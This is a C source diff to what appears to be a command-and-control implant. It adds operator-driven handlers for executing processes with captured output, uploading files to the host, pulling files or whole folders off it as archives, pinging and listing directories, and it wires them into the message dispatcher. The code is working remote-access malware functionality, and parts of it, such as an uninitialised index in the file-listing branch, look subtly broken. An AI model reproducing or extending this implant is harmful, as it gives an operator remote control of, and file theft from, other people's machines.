@@ -99,10 +99,11 @@ PENVELOPE ExecuteHandler
 	PBYTE pErrorBuffer = NULL;
 	DWORD cbErrorBuffer = 0;
 	LPWSTR lpTempPath = NULL;
+	SECURITY_ATTRIBUTES SecurityAttributes;
 
 	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
 	for (i = 0; i < _countof(RecvElementList); i++) {
-		RecvElementList[i] = ALLOC(sizeof(PPBElement));
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
 		RecvElementList[i]->dwFieldIdx = i + 1;
 	}
 
@@ -155,22 +156,32 @@ PENVELOPE ExecuteHandler
 	}
 
 	if (Output) {
-		if (lpStdOutPath == NULL && lpStdErrPath == NULL) {
-
+		if (lpStdOutPath == NULL) {
+			lpStdOutPath = GenerateTempPathA(NULL, ".txt", NULL);
 		}
 
-		if (lpStdOutPath != NULL) {
-			hStdOut = CreateFileA(lpStdOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (hStdOut == INVALID_HANDLE_VALUE) {
-				lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
-				goto CLEANUP;
-			}
-
-			StartupInfo.StartupInfo.hStdOutput = hStdOut;
+		if (lpStdErrPath == NULL) {
+			lpStdErrPath = GenerateTempPathA(NULL, ".txt", NULL);
 		}
 
-		if (lpStdErrPath != NULL) {
-			hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		SecureZeroMemory(&SecurityAttributes, sizeof(SecurityAttributes));
+		SecurityAttributes.nLength = sizeof(SecurityAttributes);
+		SecurityAttributes.lpSecurityDescriptor = NULL;
+		SecurityAttributes.bInheritHandle = TRUE;
+		StartupInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+		hStdOut = CreateFileA(lpStdOutPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hStdOut == INVALID_HANDLE_VALUE) {
+			lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
+			goto CLEANUP;
+		}
+
+		StartupInfo.StartupInfo.hStdOutput = hStdOut;
+		if (!lstrcmpA(lpStdOutPath, lpStdErrPath) && UnmarshalledData[3] != NULL && UnmarshalledData[4] != NULL) {
+			StartupInfo.StartupInfo.hStdError = hStdOut;
+		}
+		else {
+			hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (hStdErr == INVALID_HANDLE_VALUE) {
 				lpErrorDesc = CreateFormattedErr(GetLastError(), "CreateFileA() failed at %s", __FUNCTION__);
 				goto CLEANUP;
@@ -186,27 +197,28 @@ PENVELOPE ExecuteHandler
 		goto CLEANUP;
 	}
 
+	SecureZeroMemory(RespElementList, sizeof(RespElementList));
 	RespElementList[3] = CreateVarIntElement(GetProcessId(ProcessInfo.hProcess), 4);
 	if (Output) {
 		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
-		if (hStdOut != NULL) {
+		CloseHandle(hStdOut);
+		hStdOut = INVALID_HANDLE_VALUE;
+		if (UnmarshalledData[3] == NULL) {
 			lpTempPath = ConvertCharToWchar(lpStdOutPath);
 			pOutputBuffer = ReadFromFile(lpTempPath, &cbOutputBuffer);
-			CloseHandle(hStdOut);
-			hStdOut = NULL;
-			FREE(lpTempPath);
 			RespElementList[1] = CreateBytesElement(pOutputBuffer, cbOutputBuffer, 2);
-			DeleteFileW(lpTempPath);
+			FREE(lpTempPath);
+			DeleteFileA(lpStdOutPath);
 		}
-
-		if (hStdErr != INVALID_HANDLE_VALUE) {
+		
+		CloseHandle(hStdErr);
+		hStdErr = INVALID_HANDLE_VALUE;
+		if (UnmarshalledData[4] == NULL) {
 			lpTempPath = ConvertCharToWchar(lpStdErrPath);
 			pErrorBuffer = ReadFromFile(lpTempPath, &cbErrorBuffer);
-			CloseHandle(hStdErr);
-			hStdErr = NULL;
-			FREE(lpTempPath);
 			RespElementList[2] = CreateBytesElement(pErrorBuffer, cbErrorBuffer, 3);
-			DeleteFileW(lpTempPath);
+			FREE(lpTempPath);
+			DeleteFileA(lpStdErrPath);
 		}
 
 		GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode);
@@ -294,6 +306,205 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+PENVELOPE UploadHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement RecvElementList[4];
+	LPVOID* UnmarshalledData = NULL;
+	LPSTR lpPath = NULL;
+	DWORD i = 0;
+	PBUFFER pData = NULL;
+	LPWSTR lpTempStr = NULL;
+	LPWSTR lpZipPath = NULL;
+	BOOL IsDirectory = FALSE;
+	LPSTR lpFileName = NULL;
+
+	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		RecvElementList[i] = ALLOC(sizeof(PBElement));
+		RecvElementList[i]->dwFieldIdx = i + 1;
+		RecvElementList[i]->Type = Bytes;
+	}
+
+	RecvElementList[3]->Type = Varint;
+	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (UnmarshalledData[0] != NULL) {
+		lpPath = DuplicateStrA(((PBUFFER*)UnmarshalledData)[0]->pBuffer, 0);
+		lpTempStr = ConvertCharToWchar(lpPath);
+		if (!IsFolderExist(lpTempStr)) {
+			lpErrorDesc = CreateFormattedErr(0, "Folder %s is not exist", lpPath);
+			goto CLEANUP;
+		}
+	}
+	else {
+		lpPath = ALLOC(MAX_PATH);
+		GetCurrentDirectoryA(MAX_PATH, lpPath);
+		lpTempStr = ConvertCharToWchar(lpPath);
+	}
+
+	if (UnmarshalledData[2] != NULL) {
+		lpFileName = DuplicateStrA(((PBUFFER*)UnmarshalledData)[2]->pBuffer, 0);
+	}
+
+	pData = ((PBUFFER*)UnmarshalledData)[1];
+	UnmarshalledData[1] = NULL;
+	IsDirectory = ((PBOOL*)UnmarshalledData)[3];
+	UnmarshalledData[1] = NULL;
+	if (IsDirectory) {
+		GenerateTempPathW(NULL, L".zip", NULL, &lpZipPath);
+		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
+			lpErrorDesc = CreateFormattedErr(0, "Failure in writing zip file to %TEMP%");
+			goto CLEANUP;
+		}
+
+		Unzip(lpZipPath, lpTempStr);
+		DeleteFileW(lpZipPath);
+	}
+	else {
+		if (lpPath[lstrlenA(lpPath) - 1] != '\\') {
+			lpPath = StrCatExA(lpPath, "\\");
+		}
+
+		lpPath = StrCatExA(lpPath, lpFileName);
+		if (!WriteToFileA(lpPath, pData->pBuffer, pData->cbBuffer)) {
+			lpErrorDesc = CreateFormattedErr(0, "Failure in writing file tp %s", lpPath);
+			goto CLEANUP;
+		}
+	}
+
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		FreeBuffer((PBUFFER)UnmarshalledData[0]);
+		FreeBuffer((PBUFFER)UnmarshalledData[1]);
+		FreeBuffer((PBUFFER)UnmarshalledData[2]);
+		FreeBuffer((PBUFFER)UnmarshalledData[3]);
+
+		FREE(UnmarshalledData);
+	}
+
+	for (i = 0; i < _countof(RecvElementList); i++) {
+		FreeElement(RecvElementList[i]);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpTempStr != NULL) {
+		FREE(lpTempStr);
+	}
+
+	if (lpZipPath != NULL) {
+		FREE(lpZipPath);
+	}
+
+	FreeBuffer(pData);
+	return pRespEnvelope;
+}
+
+PENVELOPE DownloadHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	LPSTR lpErrorDesc = NULL;
+	PPBElement pRecvElement = NULL;
+	PPBElement pRespElement[2];
+	PPBElement pFinalElement = NULL;
+	LPVOID* UnmarshalledData = NULL;
+	LPSTR lpPath = NULL;
+	DWORD i = 0;
+	PBUFFER pData = NULL;
+	LPWSTR lpTempStr = NULL;
+	LPWSTR lpZipPath = NULL;
+	BOOL IsDirectory = FALSE;
+
+	pRecvElement = ALLOC(sizeof(PBElement));
+	pRecvElement->dwFieldIdx = i + 1;
+	pRecvElement->Type = Bytes;
+	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshalledData == NULL || UnmarshalledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpPath = DuplicateStrA(((PBUFFER*)UnmarshalledData)[0]->pBuffer, 0);
+	lpTempStr = ConvertCharToWchar(lpPath);
+	if (!IsPathExist(lpTempStr)) {
+		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		goto CLEANUP;
+	}
+
+	if (IsFolderExist(lpTempStr)) {
+		IsDirectory = TRUE;
+	}
+
+	GenerateTempPathW(NULL, L".tar.gz", NULL, &lpZipPath);
+	CompressPathByGzip(lpTempStr, lpZipPath);
+	pData = ALLOC(sizeof(BUFFER));
+	pData->pBuffer = ReadFromFile(lpZipPath, &pData->cbBuffer);
+	if (pData->pBuffer == NULL || pData->cbBuffer == 0) {
+		lpErrorDesc = CreateFormattedErr(0, "Failed to download %s", lpPath);
+		goto CLEANUP;
+	}
+
+	DeleteFileW(lpZipPath);
+	pRespElement[0] = CreateBytesElement(pData->pBuffer, pData->cbBuffer, 1);
+	pRespElement[1] = CreateVarIntElement(IsDirectory, 2);
+
+	pFinalElement = CreateStructElement(pRespElement, _countof(pRespElement), 0);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (UnmarshalledData != NULL) {
+		FreeBuffer((PBUFFER)UnmarshalledData[0]);
+		FREE(UnmarshalledData);
+	}
+
+	if (lpPath != NULL) {
+		FREE(lpPath);
+	}
+
+	if (lpTempStr != NULL) {
+		FREE(lpTempStr);
+	}
+
+	if (lpZipPath != NULL) {
+		FREE(lpZipPath);
+	}
+
+	FreeElement(pRecvElement);
+	FreeElement(pFinalElement);
+	FreeBuffer(pData);
+
+	return pRespEnvelope;
+}
+
 PENVELOPE MkdirHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -347,6 +558,40 @@ CLEANUP:
 	}
 
 	FreeElement(pElement);
+	return pRespEnvelope;
+}
+
+PENVELOPE PingHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement pRecvElement = NULL;
+	PPBElement pFinalElement = NULL;
+	DWORD dwNumberOfBytesRead = 0;
+	PUINT64 UnmarshalledData = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+	DWORD dwReturnedLength = 0;
+	UINT64 uNonce = 0;
+
+	pRecvElement = ALLOC(sizeof(PBElement));
+	pRecvElement->Type = Varint;
+	pRecvElement->dwFieldIdx = 1;
+	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
+	uNonce = UnmarshalledData[0];
+
+	pFinalElement = CreateVarIntElement(uNonce, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+
+	FreeElement(pRecvElement);
+	FreeElement(pFinalElement);
+
 	return pRespEnvelope;
 }
 
@@ -1091,7 +1336,22 @@ PENVELOPE LsHandler
 	LsElement[0] = CreateBytesElement(lpFullPath, lstrlenA(lpFullPath), 1);
 	LsElement[1] = CreateVarIntElement(TRUE, 2);
 	if (IsFileExist(lpConvertedPath)) {
-		
+		FileList = ALLOC(sizeof(PFILE_INFO));
+		FileList[0] = ALLOC(sizeof(FILE_INFO));
+		dwNumberOfItems = 1;
+		FileList[0]->dwMaxCount = dwNumberOfItems;
+		LsHandlerCallback(lpConvertedPath, FileList);
+
+		SecureZeroMemory(&FileInfoElement, sizeof(FileInfoElement));
+		FileInfoElement[0] = CreateBytesElement(FileList[0]->lpName, lstrlenA(FileList[i]->lpName), 1);
+		FileInfoElement[1] = CreateVarIntElement(FileList[0]->IsDir, 2);
+		FileInfoElement[2] = CreateVarIntElement(FileList[0]->uFileSize, 3);
+		FileInfoElement[3] = CreateVarIntElement(FileList[0]->uModifiedTime, 4);
+		FileInfoElement[5] = CreateBytesElement(FileList[0]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
+		FileInfoElement[6] = CreateBytesElement(FileList[0]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);
+
+		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
+		pElementList[0] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
 	}
 	else {
 		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
@@ -1115,10 +1375,9 @@ PENVELOPE LsHandler
 
 			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
 		}
-
-		LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
 	}
 
+	LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
 	LsElement[3] = CreateBytesElement(szTimeZone, lstrlenA(szTimeZone), 4);
 	LsElement[4] = CreateVarIntElement(TimeZoneInfo.Bias < 0 ? -(TimeZoneInfo.Bias * 60) : TimeZoneInfo.Bias * 60, 5);
 	pFinalElement = CreateStructElement(LsElement, _countof(LsElement), 0);
@@ -3656,16 +3915,16 @@ VOID MainHandler
 	
 	}
 	else if (pEnvelope->uType == MsgPing) {
-	
+		pResp = PingHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgLsReq) {
 		pResp = LsHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgDownloadReq) {
-	
+		pResp = DownloadHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgUploadReq) {
-	
+		pResp = UploadHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgCdReq) {
 		pResp = CdHandler(pEnvelope);
@@ -3677,10 +3936,10 @@ VOID MainHandler
 		pResp = RmHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgMvReq) {
-	
+		pResp = MvHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgCpReq) {
-	
+		pResp = CpHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgMkdirReq) {
 		pResp = MkdirHandler(pEnvelope);
@@ -3732,4 +3991,3 @@ VOID MainHandler
 
 	return;
 }
-
